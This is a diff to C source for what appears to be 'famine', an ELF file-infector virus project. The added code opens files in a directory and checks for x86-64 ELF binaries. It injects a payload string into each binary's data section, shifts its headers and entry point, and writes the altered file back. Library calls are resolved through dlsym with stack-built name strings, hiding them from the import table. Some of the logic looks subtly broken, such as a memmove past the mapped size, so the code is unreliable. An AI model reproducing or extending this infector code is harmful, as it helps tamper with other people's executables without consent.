@@ -1,12 +1,51 @@
 #include "famine.h"
 #include <signal.h>
 
+static void updateOffsets(Elf64_Ehdr *header, size_t offset, size_t toAdd) {
+    size_t      i;
+    Elf64_Shdr  *section;
+    Elf64_Phdr  *program;
+
+    if (header->e_entry > offset)
+      header->e_entry += toAdd;
+    if (header->e_phoff > offset)
+      header->e_phoff += toAdd;
+    if (header->e_shoff > offset)
+      header->e_shoff += toAdd;
+    i = 0;
+    while (i < header->e_shnum) {
+        section = (void *)(header) + header->e_shoff + i * sizeof(Elf64_Shdr);
+        if (section->sh_offset > offset)
+            section->sh_offset += toAdd;
+        i += 1;
+    }
+    i = 0;
+    while (i < header->e_phnum) {
+        program = ((void *)header) + header->e_phoff + i * sizeof(Elf64_Phdr);
+        if (program->p_offset > offset)
+            program->p_offset += toAdd;
+        if (program->p_paddr > offset)
+            program->p_paddr += toAdd;
+        i += 1;
+    }
+}
+
 static int  isCompatible(unsigned char e_ident[EI_NIDENT], Elf64_Half e_machine) {
   return (e_ident[EI_MAG0] == ELFMAG0 &&
           e_ident[EI_MAG1] == ELFMAG1 &&
           e_ident[EI_MAG2] == ELFMAG2 &&
           e_ident[EI_MAG3] == ELFMAG3 &&
           e_machine == EM_X86_64);
+}
+
+static int  appendSignature(struct bfile file, size_t offset, size_t  (*strlen)(const char *),
+void *(*memmove)(void *, const void *, size_t), const char *payload, void *(*memcpy)(void *, const void *, size_t)) {
+  size_t  toAdd;
+
+  toAdd = strlen(payload) + 1;
+  memmove(((void *)file.header) + offset + toAdd, ((void *)file.header) + offset, file.size - offset);
+  memcpy(((void *)file.header) + offset, payload, toAdd);
+  return (0);
 }
 
 static Elf64_Shdr *getDataSectionHeader(Elf64_Ehdr *header, int (*strcmp)(const char *, const char *)) {
@@ -31,13 +70,16 @@ const char *dirname,  const char *filename, const char *payload) {
   int     (*close)(int);
   void    (*free)(void *);
   int     (*fstat)(int, int, struct stat *);
-  int     (*dprintf)(int, const char *, ...);
   void    (*raise)(int);
   void    *(*mmap)(void *, size_t, int, int, int, off_t);
   int     (*munmap)(void *, size_t);
   int     (*strcmp)(const char *, const char *);
+  void    *(*memmove)(void *, const void *, size_t);
+  void    *(*memcpy)(void *, const void *, size_t);
+  ssize_t (*write)(int, const void *, size_t);
   char    mallocName[] = "malloc";
   char    strcpyName[] = "strcpy";
+  char    memcpyName[] = "memcpy";
   char    strcatName[] = "strcat";
   char    strlenName[] = "strlen";
   char    openName[] = "open";
@@ -46,9 +88,10 @@ const char *dirname,  const char *filename, const char *payload) {
   char    fstatName[] = "__fxstat";
   char    mmapName[] = "mmap";
   char    munmapName[] = "munmap";
-  char    dprintfName[] = "dprintf";
   char    raiseName[] = "raise";
   char    strcmpName[] = "strcmp";
+  char    memmoveName[] = "memmove";
+  char    writeName[] = "write";
   char    slash[] = "/";
 
   malloc = dlsym(handle, mallocName);
@@ -61,14 +104,18 @@ const char *dirname,  const char *filename, const char *payload) {
   mmap = dlsym(handle, mmapName);
   munmap = dlsym(handle, munmapName);
   strlen = dlsym(handle, strlenName);
-  dprintf = dlsym(handle, dprintfName);
   raise = dlsym(handle, raiseName);
   strcmp = dlsym(handle, strcmpName);
+  memmove = dlsym(handle, memmoveName);
+  write = dlsym(handle, writeName);
+  memcpy = dlsym(handle, memcpyName);
 
   int         fd;
   char        *tmp;
   struct stat stats;
   struct bfile file;
+  Elf64_Shdr  *data;
+  Elf64_Off   offset;
 
   if ((tmp = malloc(strlen(dirname) + strlen(filename) + 2)) == NULL)
     return (-1);
@@ -81,7 +128,6 @@ const char *dirname,  const char *filename, const char *payload) {
   }
   free(tmp);
   if (fstat(1, fd, &stats) == -1) {
-    raise(SIGTRAP);
     close(fd);
     return (-1);
   }
@@ -90,11 +136,16 @@ const char *dirname,  const char *filename, const char *payload) {
     close(fd);
     return (-1);
   }
-  close(fd);
   if ((size_t)(file.size) < sizeof(Elf64_Ehdr) || !isCompatible(file.header->e_ident, file.header->e_machine))
     return (1);
-  Elf64_Shdr  *data;
   data = getDataSectionHeader(file.header, strcmp);
+  data->sh_size += strlen(payload) + 1;
+  offset = data->sh_offset;
+  appendSignature(file, offset + data->sh_size - (strlen(payload) + 1), strlen, memmove, payload, memcpy);
+  file.size += strlen(payload) + 1;
+  updateOffsets(file.header, offset + data->sh_size - strlen(payload) - 1, strlen(payload) + 1);
+  write(fd, file.header, file.size);
+  close(fd);
   munmap(file.header, file.size);
   return (0);
 }
